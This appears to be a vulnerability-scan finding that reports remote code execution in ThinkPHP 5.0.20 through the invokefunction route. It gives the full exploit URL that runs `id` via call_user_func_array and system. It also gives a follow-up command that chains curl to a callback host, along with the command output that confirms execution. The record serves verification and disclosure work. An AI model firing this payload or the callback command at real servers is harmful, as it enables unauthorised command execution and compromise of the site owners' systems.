findings.reported_class: Remote code execution / arbitrary PHP function invocation (ThinkPHP 5.0.20 invokefunction route)
findings.evidence: Requesting /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id returned command output: uid=33(www-data) gid=33(www-data) groups=33(www-data). A follow-up command `id; curl http://host.docker.internal:52664/2eb609701b1f64fd1c5f10e24ae34624/index.php` returned `uid=33(www-data) gid=33(www-data) groups=33(www-data)\nokok`, confirming server-side command execution and callback trigger.
